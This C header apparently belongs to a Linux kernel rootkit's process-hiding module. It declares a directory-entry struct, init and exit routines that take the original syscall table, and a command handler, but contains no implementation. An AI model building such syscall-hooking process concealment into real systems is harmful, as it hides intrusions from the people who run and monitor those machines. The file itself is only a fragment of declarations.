#ifndef __PROCESS_MASKER__
#define __PROCESS_MASKER__

#include "core.h"

#define PIDS_BUFFSIZE 8

struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

void process_masker_init(struct orig *original_syscalls);
void process_masker_exit(void);
void pm_command(char *cmd);

#endif
